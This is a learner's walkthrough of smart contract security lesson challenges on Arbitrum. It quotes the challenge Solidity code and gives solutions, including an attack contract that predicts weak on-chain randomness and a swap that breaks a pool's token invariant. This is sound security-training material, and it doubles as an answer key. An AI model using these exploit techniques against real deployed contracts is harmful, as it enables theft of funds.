# Lesson Challenges

### [Challenge 0](https://arbiscan.io/address/0xf923431da74ecc873c4d641fbdfa2564baafca9f#code)
```solidity
 /*
     * CALL THIS FUNCTION!
     * 
     * @param yourTwitterHandle - Your twitter handle. Can be a blank string.
     */
    function solveChallenge(string memory twitterHandle) external {
        _updateAndRewardSolver(twitterHandle);
    }
```
- Self explanatory, just enter a string

### [Challenge 1](https://arbiscan.io/address/0x7a0f40757f6ba868b44ce959a1d4b8bc22c21d59)
`S1.sol`
```solidity
    /*
     * CALL THIS FUNCTION!
     * 
     * @param the function selector of the first one you need to call
     * @param the abi encoded data... hint! Use chisel to figure out what to use here...
     * @param yourTwitterHandle - Your twitter handle. Can be a blank string.
     */
    function solveChallenge(bytes4 selectorOne, bytes memory inputData, string memory yourTwitterHandle) external {
        (bool successOne, bytes memory responseDataOne) = i_helperContract.call(abi.encodeWithSelector(selectorOne));
        if (!successOne || uint256(bytes32((responseDataOne))) != 1) {
            revert S1__WrongSelector();
        }

        (bool successTwo, bytes memory responseDataTwo) = i_helperContract.call(inputData);
        if (!successTwo || uint256(bytes32((responseDataTwo))) != 1) {
            revert S1__WrongData();
        }
        _updateAndRewardSolver(yourTwitterHandle);
    }

    function getHelperContract() external view returns (address) {
        return i_helperContract;
    }
```
- For this challenge we need to call the function selector for "the first one you need to call"
- We see that there is `i_helperContract.call(abi.encodeWithSelector(selectorOne))`, so "the first one you need to call", probably means the first function in the helper contract

`S1Helper.sol`
```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

contract S1Helper {
    function returnTrue() external pure returns (bool) {
        return true;
    }

    function returnTrueWithGoodValues(uint256 nine, address contractAddress) public view returns (bool) {
        if (nine == 9 && contractAddress == address(this)) {
            return true;
        }
        return false;
    }
}
```
- From the helper contract, we see that `returnTrue` is the first function
- We can use cast to get the selector
```
$ cast keccak "returnTrue()"
0xf613a6873d6cfa57a62ebf63d2f80e5e639fa6df74ad2066cb9579549b44912c
```
- The selector will be the first [4 bytes](https://solidity-by-example.org/function-selector/): `0xf613a687`
- `cast sig "returnTrue()"` does all the work for us
- Since the function doesn't require any arguments, we can use the selector for both parameters of the challenge

### [Challenge 2](https://arbiscan.io/address/0xeab9c7ac697408fd1581494577c7c0716c3b75e6#code)
```
/*
     * CALL THIS FUNCTION!
     * 
     * @param weCallItSecurityReview - Set "true" if you'll call it "security review" instead of "security audit".
     * @param yourTwitterHandle - Your twitter handle. Can be a blank string.
     */
    function solveChallenge(bool weCallItSecurityReview, string memory yourTwitterHandle) external {
        if (!weCallItSecurityReview) {
            revert S2__WrongValue();
        }
        _updateAndRewardSolver(yourTwitterHandle);
    }
```
- We want to bypass the if check, so use `true` for the first parameter.

### [Challenge 3](https://arbiscan.io/address/0x89edc4c74810bedbd53d7da677eb420dc0154b0b#code)
```
 function solveChallenge(uint256 valueAtStorageLocationSevenSevenSeven, string memory yourTwitterHandle) external {
        uint256 value;
        assembly {
            value := sload(STORAGE_LOCATION)
        }
        if (value != valueAtStorageLocationSevenSevenSeven) {
            revert S3__WrongValue();
        }
        // slither-disable-next-line weak-prng
        uint256 newValue =
            uint256(keccak256(abi.encodePacked(msg.sender, block.prevrandao, block.timestamp))) % 1_000_000;
        assembly {
            sstore(STORAGE_LOCATION, newValue)
        }
        _updateAndRewardSolver(yourTwitterHandle);
    }
```
- We know that our variable is going to be stored in storage location 777. 
- We can use `cast`:
`cast storage 0x89edc4c74810bedbd53d7dA677eB420DC0154B0b 777 --rpc-url $ARBITRUM_RPC_URL`

### [Challenge 4](https://arbiscan.io/address/0xef72ba6575b86beaa9b9e4a78bca4a58f3cce276)
```
/*
 * CALL THIS FUNCTION!
 * 
 * @param guess - your guess to solve the challenge. 
 * @param yourTwitterHandle - Your twitter handle. Can be a blank string.
 */
function solveChallenge(uint256 guess, string memory yourTwitterHandle) external {
	(bool success, bytes memory returnData) = msg.sender.staticcall(abi.encodeWithSignature("owner()"));
	address ownerAddress;
	assembly {
		ownerAddress := mload(add(returnData, 32))
	}
	if (!success || ownerAddress != msg.sender) {
		revert S4__BadOwner();
	}
	if (myVal == 1) {
		// slither-disable-next-line weak-prng
		uint256 rng =
			uint256(keccak256(abi.encodePacked(msg.sender, block.prevrandao, block.timestamp))) % 1_000_000;
		if (rng != guess) {
			revert S4__BadGuess();
		}
		_updateAndRewardSolver(yourTwitterHandle);
	} else {
		myVal = 1;
		(bool succ,) = msg.sender.call(abi.encodeWithSignature("go()"));
		if (!succ) {
			revert S4__BadReturn();
		}
	}
	myVal = 0;
}
```
- We need to create an attack contract to take advantage of the weak randomness implemented by the challenge
- Our attack contract should have a function called `owner()` and a function called `go()`

 `owner()` needs to return the address of the attack contract
```js
function owner() external view returns (address) {
	return address(this);
}
```

 `go()` should handle the `rng` calculation and call the `solveChallenge` function
```js
function go() external {
	string memory handle = "";
	uint256 rng = uint256(keccak256(abi.encodePacked(address(this), block.prevrandao, block.timestamp))) % 1_000_000;
	challengeContract.solveChallenge(rng, handle);
}
```

Our contract should be able to receive NFTs
```js
import {IERC721Receiver} from "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import {IERC721} from "@openzeppelin/contracts/token/ERC721/IERC721.sol";

contract S4Attack is IERC721Receiver {
	...
	
	function onERC721Received(address, address, uint256, bytes calldata) external pure override returns (bytes4) {
		return this.onERC721Received.selector;
	}

    ...
}
```

### [Challenge 5](https://arbiscan.io/address/0xbdaab68a462db80fb0052947bdadba7a87fcd0fb#code)
```js
function solveChallenge(string memory twitterHandle) external {
        s_pool.redeem(uint64(block.timestamp));
        if (s_tokenA.balanceOf(address(this)) + s_tokenB.balanceOf(address(this)) >= i_initialTotalTokens) {
            revert S5__InvariantInTact();
        }
        _setupPoolAndTokens();
        _updateAndRewardSolver(twitterHandle);
    }
```
- We need to  break the invariant that the supply of `s_tokenA` + `s_tokenB` >= `i_initialTotalTokens`
- `i_initialTotalTokens = s_tokenA.INITIAL_SUPPLY() + s_tokenB.INITIAL_SUPPLY();`

The pool setup gives us the information we need:
```js
function _setupPoolAndTokens() private {
        s_tokenA = new S5Token("A");
        s_tokenB = new S5Token("B");
        s_tokenC = new S5Token("C");
        // For gas savings
        S5Token tokenA = s_tokenA;
        S5Token tokenB = s_tokenB;
        S5Token tokenC = s_tokenC;

        s_pool = new S5Pool(tokenA, tokenB, tokenC);
        S5Pool pool = s_pool;
        pool.transferOwnership(i_randomPoolOwner);

        tokenA.approve(address(pool), type(uint256).max);
        tokenB.approve(address(pool), type(uint256).max);
        tokenC.approve(address(pool), type(uint256).max);
        pool.deposit(tokenA.INITIAL_SUPPLY(), uint64(block.timestamp));
    }
```
- A new pool is created taking three tokens (`tokenA`, `tokenB`, `tokenC`)
- The `deposit` function is called on the pool using `INITIAL_SUPPLY` as the amount

From the [token contract](https://arbiscan.io/address/0xC912ae030b16c606C2859206c0C096c0Dd952cEF#code), we can see the value of `INITIAL_SUPPLY`:
```js
uint256 public constant INITIAL_SUPPLY = PRECISION * 1000;
```

From the [pool contract](https://arbiscan.io/address/0x0Ab82E2e565A5B64988DCF6B60435829B46b9180#code), we can see that each token has an equal amount (1000) deposited:
```js
function deposit(uint256 amount, uint64 deadline) external revertIfDeadlinePassed(deadline) revertIfZero(amount) {
	_mint(msg.sender, amount);
	emit Deposited(msg.sender, amount);
	i_tokenA.safeTransferFrom(msg.sender, address(this), amount);
	i_tokenB.safeTransferFrom(msg.sender, address(this), amount);
	i_tokenC.safeTransferFrom(msg.sender, address(this), amount);
}
```

**Solving**
When `S5::_setupPoolAndTokens()` is called, it creates a pool that contains three tokens with 1000 of each token. 
 - Our goal is to break the invariant that relies on `S5::i_initialTotalTokens`
 - The  constructor will set this value to 2000
 - We need to manipulate the pool so that `tokenA + tokenB < INITIAL_SUPPLY`

We can take advantage of `S5Pool::swapFrom`
```js
/* 
     * @notice swap tokenA for tokenB or vice versa.
     * @dev swapping has a 0.03% fee for LPs
     */
    function swapFrom(IERC20 tokenFrom, IERC20 tokenTo, uint256 amount)
        external
        revertIfUnknownToken(tokenFrom)
        revertIfUnknownToken(tokenTo)
    {
        // Checks
        if (tokenTo.balanceOf(address(this)) < amount) {
            revert S5Pool__NotEnoughBalance(tokenTo, amount);
        }

        // Effects
        // LP fees
        uint256 lpFee = calculateFee(amount);
        // Owner fees
        uint256 ownerFee = calculateFee(amount);
        s_totalOwnerFees = s_totalOwnerFees + ownerFee;
        uint256 amountMinusFee = amount - (lpFee + ownerFee);
        emit Swapped(msg.sender, tokenFrom, tokenTo, amountMinusFee);

        // Interactions
        tokenFrom.safeTransferFrom(msg.sender, address(this), amountMinusFee);
        tokenTo.safeTransfer(msg.sender, amountMinusFee);
    }
```
- `tokenFrom` is the token `msg.sender` will be swapping into the pool (approve this to mint)
- `tokenTo` is the token that `msg.sender` will be taking from the pool (approve this to receive)
- This should break the invariant as there should be less than 1000 of `tokenA` after the swap

I approved `tokenA` and `tokenC` for my address, but was still facing issues.
- I had to approve `tokenC` for the pool.
- I'm not sure why this is the case because when the pool was deployed, there was a max approval:
```js
tokenA.approve(address(pool), type(uint256).max);
tokenB.approve(address(pool), type(uint256).max);
tokenC.approve(address(pool), type(uint256).max);
```
- After appoving `tokenC` for the pool, the invariant is successfully broken

To check balances, go to each token contract and check the balance of the pool address
